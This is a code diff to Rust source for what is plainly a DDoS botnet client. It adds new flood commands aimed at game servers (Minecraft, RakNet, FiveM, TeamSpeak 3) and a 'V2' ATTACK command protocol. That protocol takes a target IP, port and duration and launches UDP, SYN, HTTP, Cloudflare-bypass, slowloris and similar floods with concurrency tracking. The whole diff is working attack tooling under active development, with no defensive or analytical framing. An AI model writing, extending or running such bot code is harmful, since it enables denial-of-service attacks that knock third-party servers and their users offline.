@@ -329,7 +329,8 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
         "!ackflood" | "!greflood" | "!dns" | "!http" |
         "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
         "!amplification" | "!connection" |
-        "!vse" | "!ovh" | "!cfbypass" | "!stress" => {
+        "!vse" | "!ovh" | "!cfbypass" | "!stress" |
+        "!minecraft" | "!raknet" | "!fivem" | "!ts3" | "!udpmax" => {
             handle_attack_command(cmd, &fields, state).await?;
         }
         
@@ -366,12 +367,103 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
             tracing::info!("Persist command received");
             // Placeholder for persistence functionality
         }
+
+        "ATTACK" => {
+            handle_v2_attack_command(&fields, state).await?;
+        }
         
         _ => {
             tracing::warn!("Unknown command: {}", cmd);
         }
     }
     
+    Ok(())
+}
+
+async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Result<()> {
+    // Format: ATTACK <id> <method> <ip> <port> <duration>
+    if fields.len() != 6 {
+        return Err(anyhow::anyhow!("Invalid ATTACK command format"));
+    }
+
+    let attack_id = fields[1].parse::<usize>()?;
+    let method = fields[2].to_uppercase();
+    let target = fields[3].to_string();
+    let port = fields[4].parse::<u16>()?;
+    let duration = fields[5].parse::<u64>()?;
+
+    // Validate target IP
+    if !is_valid_target_ip(&target) {
+        tracing::warn!("Rejected attack on invalid/private IP: {}", target);
+        return Err(anyhow::anyhow!("Target IP is invalid or in blocked range"));
+    }
+
+    // Validate duration
+    if duration == 0 || duration > 3600 {
+        return Err(anyhow::anyhow!("Invalid duration"));
+    }
+
+    // Check permit
+    let permit = state.attack_semaphore.clone().try_acquire_owned();
+    if permit.is_err() {
+        tracing::warn!("Attack limit reached - dropping attack command");
+        return Ok(());
+    }
+    let permit = permit.unwrap();
+
+    // Increment active
+    {
+        let mut active = state.active_attacks.lock().await;
+        *active += 1;
+        tracing::info!("Starting V2 attack: {} {}:{} for {}s ({} active)", method, target, port, duration, *active);
+    }
+
+    let state_clone = state.clone();
+    let method_clone = method.clone();
+    
+    let handle = tokio::spawn(async move {
+        let start = Instant::now();
+        
+        let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match method_clone.as_str() {
+            "UDP" => { attack_methods::udp_flood(&target, port, duration).await; Ok(()) },
+            "TCP" => { attack_methods::tcp_flood(&target, port, duration).await; Ok(()) },
+            "SYN" => { attack_methods::syn_flood(&target, port, duration).await; Ok(()) },
+            "ACK" => { attack_methods::ack_flood(&target, port, duration).await; Ok(()) },
+            "VSE" => { attack_methods::vse_flood(&target, port, duration).await; Ok(()) },
+            "OVH" => { attack_methods::ovh_flood(&target, port, duration).await; Ok(()) },
+            "HTTP" => { attack_methods::http_flood(&target, port, duration).await; Ok(()) },
+            "CFBYPASS" | "CF" => { attack_methods::cf_bypass_flood(&target, port, duration).await; Ok(()) },
+            "SLOWLORIS" => { attack_methods::slowloris(&target, port, duration).await; Ok(()) },
+            "STRESS" => { attack_methods::http_stress(&target, port, duration).await; Ok(()) },
+            "MINECRAFT" => { attack_methods::minecraft_flood(&target, port, duration).await; Ok(()) },
+            "RAKNET" => { attack_methods::raknet_flood(&target, port, duration).await; Ok(()) },
+            "FIVEM" => { attack_methods::fivem_flood(&target, port, duration).await; Ok(()) },
+            "TS3" => { attack_methods::ts3_flood(&target, port, duration).await; Ok(()) },
+            "TLS" | "SSL" => { attack_methods::ssl_flood(&target, port, duration).await; Ok(()) },
+            "DNS" => { attack_methods::dns_flood(&target, port, duration).await; Ok(()) },
+            _ => {
+                tracing::warn!("Unknown V2 attack method: {}", method_clone);
+                Ok(())
+            }
+        };
+
+        let elapsed = start.elapsed().as_secs();
+        if let Err(e) = result {
+            tracing::error!("Attack {} failed: {}", method_clone, e);
+        } else {
+            tracing::info!("Attack {} completed after {}s", method_clone, elapsed);
+        }
+
+        {
+            let mut active = state_clone.active_attacks.lock().await;
+            *active = active.saturating_sub(1);
+        }
+        state_clone.attack_handles.lock().await.remove(&attack_id);
+        drop(permit);
+    });
+
+    state.attack_handles.lock().await.insert(attack_id, handle);
+
     Ok(())
 }
 
@@ -446,6 +538,10 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
                 attack_methods::udp_smart(&target, port, duration).await;
                 Ok(())
             }
+            "!udpmax" => {
+                attack_methods::udp_max_flood(&target, port, duration).await;
+                Ok(())
+            }
             "!tcpflood" => {
                 attack_methods::tcp_flood(&target, port, duration).await;
                 Ok(())
@@ -508,6 +604,22 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
             }
             "!stress" => {
                 attack_methods::http_stress(&target, port, duration).await;
+                Ok(())
+            }
+            "!minecraft" => {
+                attack_methods::minecraft_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!raknet" => {
+                attack_methods::raknet_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!fivem" => {
+                attack_methods::fivem_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!ts3" => {
+                attack_methods::ts3_flood(&target, port, duration).await;
                 Ok(())
             }
             _ => {
